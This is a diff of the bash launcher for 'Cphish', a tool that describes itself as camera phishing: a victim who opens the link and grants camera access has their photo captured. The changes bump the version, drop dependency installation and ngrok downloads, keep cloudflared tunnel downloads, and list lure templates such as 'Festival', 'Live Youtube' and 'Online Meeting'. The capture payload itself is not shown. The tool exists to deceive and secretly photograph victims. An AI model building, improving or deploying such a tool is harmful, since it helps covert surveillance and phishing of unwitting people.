@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # Cphish 
-# Version    : 1.0
-# Description: Cphish is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Version    : 1.2.3
+# Description: Cphish is a camera Phishing tool.
 # Author     : Sajid Ibn Nayeem
 # Github     : https://github.com/SajidIbnNayeem
 
@@ -32,7 +32,7 @@ cwd=`pwd`
 # Logo 
 logo="    
 ${yellow}                     
-${yellow}        █▀▀ █▀█ █░█ █ █▀ █░█ ${red}v1.0
+${yellow}        █▀▀ █▀█ █░█ █ █▀ █░█ ${red}v1.2.3
 ${yellow}        █▄▄ █▀▀ █▀█ █ ▄█ █▀█ 
 
 
@@ -81,12 +81,6 @@ netcheck() {
     done
 }
 
-# Delete ngrok file
-ngrokdel() {
-    unzip ngrok.zip
-    rm -rf ngrok.zip
-}
-
 # Set template
 replacer() {
     while true; do
@@ -128,7 +122,7 @@ replacer() {
 stty -echoctl
 
 # Detect UserInterrupt
-trap "echo -e ' \n ${yellow}🤩 Thanks for Using!... '; exit" 2
+trap "echo -e ' \n ${yellow}🤩 Thanks for Using!...\n Your Star Can Help This Project Reach More People!\n If You Like Cphish,\n Give it a Star! '; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
@@ -196,74 +190,6 @@ else
 fi
 fi
 
-
-# Install Dependicies
-if ! [ `command -v php` ]; then
-    echo -e "${info}Installing php...."
-    $pac_man install php -y
-    pacin php
-fi
-if ! [ `command -v curl` ]; then
-    echo -e "${info}Installing curl...."
-    $pac_man install curl -y
-    pacin "unzip"
-fi
-if ! [ `command -v unzip` ]; then
-    echo -e "${info}Installing unzip...."
-    $pac_man install unzip -y
-    pacin "unzip"
-fi
-if ! [ `command -v wget` ]; then
-    echo -e "${info}Installing wget...."
-    $pac_man install wget -y
-    pacin "wget"
-fi
-if $termux; then
-if ! [ `command -v proot` ]; then
-    echo -e "${info}Installing proot...."
-    pkg install proot -y
-fi
-if ! [ `command -v proot` ]; then
-    echo -e "${error}Proot can't be installed!\007\n"
-    exit 1
-fi
-fi
-if ! [ `command -v php` ]; then
-    echo -e "${error}PHP cannot be installed!\007\n"
-    exit 1
-fi
-if ! [ `command -v curl` ]; then
-    echo -e "${error}Curl cannot be installed!\007\n"
-    exit 1
-fi
-if ! [ `command -v unzip` ]; then
-    echo -e "${error}Unzip cannot be installed!\007\n"
-    exit 1
-fi
-if ! [ `command -v wget` ]; then
-    echo -e "${error}Wget cannot be installed!\007\n"
-    exit 1
-fi
-if [ `pidof php > /dev/null 2>&1` ]; then
-    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
-    killer; exit 1
-fi
-if [ `pidof ngrok > /dev/null 2>&1` ]; then
-    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
-    killer; exit 1
-fi
-
-# Termux should run from home
-if $termux; then
-    path=`pwd`
-    if echo "$path" | grep -q "home"; then
-        printf ""
-    else
-        echo -e "${error}Invalid directory. Run from home!\007\n"
-        killer; exit 1
-    fi
-fi
-
 # Download tunnlers
 if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     if ! [[ -d $HOME/.ngrokfolder ]]; then
@@ -275,7 +201,7 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     p=`uname -m`
     d=`uname`
     while true; do
-        echo -e "\n${info}Downloading Tunnelers:\n"
+        echo -e "\n${white}Tool Created by Sajid Ibn Nayeem  \n"
         netcheck
         if [ -e ngrok.zip ];then
             rm -rf ngrok.zip
@@ -305,24 +231,15 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
                 if [ -e ngrok-stable-linux-arm64.tgz ];then
                    rm -rf ngrok-stable-linux-arm64.tgz
                 fi
-                wget -q --show-progress "https://github.com/SajidIbnNayeem/filess/blob/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
-                tar -zxf ngrok.tgz
-                rm -rf ngrok.tgz
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                 break
             elif echo "$p" | grep -q "arm"; then
-                wget -q --show-progress "https://github.com/SajidIbnNayeem/filess/blob/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
-                ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                 break
             elif echo "$p" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/SajidIbnNayeem/filess/blob/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
-                ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                 break
             else
-                wget -q --show-progress "https://github.com/SajidIbnNayeem/filess/blob/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
-                ngrokdel
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                 break
             fi
@@ -333,13 +250,10 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     done
     sleep 1
     cd "$cwd"
-    mv -f ngrok $HOME/.ngrokfolder
     mv -f cloudflared $HOME/.cffolder
     if $sudo; then
-    sudo chmod +x $HOME/.ngrokfolder/ngrok
     sudo chmod +x $HOME/.cffolder/cloudflared
     else
-    chmod +x $HOME/.ngrokfolder/ngrok
     chmod +x $HOME/.cffolder/cloudflared
     fi
 fi
@@ -357,8 +271,6 @@ ${yellow}[${white}2${yellow}] ${red}Festival
 ${yellow}[${white}3${yellow}] ${red}Live Youtube
 
 ${yellow}[${white}4${yellow}] ${red}Online Meeting
-
-${yellow}[${white}t${yellow}] ${red}Change Default Tunneler (current: ${yellow}${TN}${red})
 
 ${yellow}[${white}x${yellow}] ${red}About
 "
@@ -412,7 +324,7 @@ read option
         clear
         echo -e "$logo"
         echo -e "$yellow[ToolName]  ${green}  :  [Cphish]
-$yellow[Version]    ${green} :  [1.0]
+$yellow[Version]    ${green} :  [1.2.3]
 $yellow[Description]${green} :  [Camera Phishing tool]
 $yellow[Author]     ${green} :  [Sajid Ibn Nayeem]
 $yellow[Github]     ${green} :  [https://github.com/SajidIbnNayeem]"
